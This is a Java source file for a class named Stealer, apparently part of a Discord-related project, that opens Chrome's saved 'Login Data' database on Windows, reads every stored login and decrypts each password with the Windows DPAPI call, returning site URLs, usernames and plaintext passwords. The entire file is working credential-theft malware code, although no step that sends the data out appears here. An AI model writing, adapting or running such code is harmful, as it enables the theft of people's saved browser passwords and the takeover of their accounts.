package me.mafrans.discordsw.stealer;

import com.sun.jna.platform.win32.Crypt32Util;

import java.io.UnsupportedEncodingException;
import java.sql.*;
import java.util.ArrayList;
import java.util.List;

/**
 * Created by Lemon on 8/26/2017.
 */
public class Stealer
{
    private static String dbLocation = System.getenv("LOCALAPPDATA") + "\\Google\\Chrome\\User Data\\Default\\Login Data";

    private static Connection connect() throws SQLException, ClassNotFoundException
    {
            // db parameters
            Class.forName("org.sqlite.JDBC");
            String url = "jdbc:sqlite:" + dbLocation;
            // create me.mafrans.discordsw.Main connection to the database
            return DriverManager.getConnection(url);
    }

    public static  List<Data> steal()
    {
        try
        {
           Connection connection =  connect();
           Statement st = connection.createStatement();
           ResultSet set = st.executeQuery("SELECT * FROM logins");
           List<Data> data = new ArrayList<Data>();
           while(set.next())
           {
               String siteURL = set.getString("action_url");
               String username = set.getString("username_value");
               byte[] passwordBlob = set.getBytes("password_value");
               byte[] decryptedBlob = Crypt32Util.cryptUnprotectData(passwordBlob);
               String password = new String(decryptedBlob, "UTF-8");
               Data dt = new Data(siteURL, username, password);
               data.add(dt);

           }
           return data;
        }
        catch(SQLException | ClassNotFoundException | UnsupportedEncodingException ex)
        {
            ex.printStackTrace();
            return new ArrayList<Data>();
        }
    }
}
